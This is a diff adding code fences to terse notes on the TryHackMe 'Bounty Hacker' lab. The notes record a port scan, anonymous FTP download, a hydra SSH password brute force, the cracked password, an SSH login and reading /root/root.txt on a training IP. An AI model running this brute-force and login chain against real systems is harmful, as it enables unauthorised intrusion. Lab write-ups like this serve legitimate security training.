@@ -1,8 +1,12 @@
+# THM - Bounty Hacker.txt
+
+```shell
 nmap -sV -Pn -p- 10.10.146.228
+```
 
 Examining Web Server | Users: ed faye ein spike edward jet 
 
-
+```shell
 ftp 10.10.146.228
 	anonymous
 		mget *
@@ -11,9 +15,11 @@ ftp 10.10.146.228
 
 
 hydra ssh://10.10.146.228 -L users.txt -P locks.txt
+```
 
 > RedDr4gonSynd1cat3
 
+```shell
 ssh lin@10.10.146.228
 	yes
 	RedDr4gonSynd1cat3
@@ -28,4 +34,4 @@ ssh lin@10.10.146.228
 			whoami
 
 			cat /root/root.txt
-
+```
